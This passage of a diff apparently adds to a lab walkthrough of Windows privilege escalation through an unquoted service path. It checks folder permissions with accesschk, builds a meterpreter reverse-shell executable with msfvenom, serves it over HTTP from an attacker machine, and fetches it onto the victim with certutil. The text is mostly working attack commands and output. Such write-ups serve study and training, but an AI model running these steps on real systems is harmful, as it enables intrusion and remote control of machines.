@@ -190,3 +190,75 @@ No write access for normal users here either.
 <p align="center">
   <img src="/Windows-Privilege-Escalation/unquoted path service/images/step2-1.png" width="600">
 </p>
+
+Check C:\Program Files\Unquoted Path Service\
+
+```bash
+C:\PrivEsc>.\accesschk /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
+```
+
+**Output:**
+
+```
+C:\Program Files\Unquoted Path Service
+  Medium Mandatory Level (Default) [No-Write-Up]
+  RW BUILTIN\Users
+  RW NT SERVICE\TrustedInstaller
+  RW NT AUTHORITY\SYSTEM
+  RW BUILTIN\Administrators
+```
+`RW BUILTIN\Users` — any normal user on the machine can write to this folder. That is exactly what I needed.
+
+### Step 3 — Generating a New Payload and Downloading it to the Victim
+
+Generated Payload on Kali
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.5.128 LPORT=4444 -f exe -o rev.exe
+``` 
+
+**Output:**
+
+```
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of exe file: 7680 bytes
+Saved as: rev.exe
+```
+
+<p align="center">
+  <img src="/Windows-Privilege-Escalation/unquoted path service/images/step3-1.png" width="600">
+</p>
+
+Started Python HTTP Server on Kali
+
+```bash
+python3 -m http.server 80
+```
+
+**Output:**
+
+```
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+192.168.5.144 - - [20/Jun/2026 22:51:35] "GET / HTTP/1.1" 200 -
+```
+
+Downloaded the Payload on the Victim Machine
+
+```bash
+certutil -urlcache -split -f http://192.168.5.128/rev.exe rev.exe
+```
+
+**Output:**
+
+```
+****  Online  ****
+  0000  ...
+  1e00
+CertUtil: -URLCache command completed successfully.
+```
+<p align="center">
+  <img src="/Windows-Privilege-Escalation/unquoted path service/images/step3-2.png" width="600">
+</p>
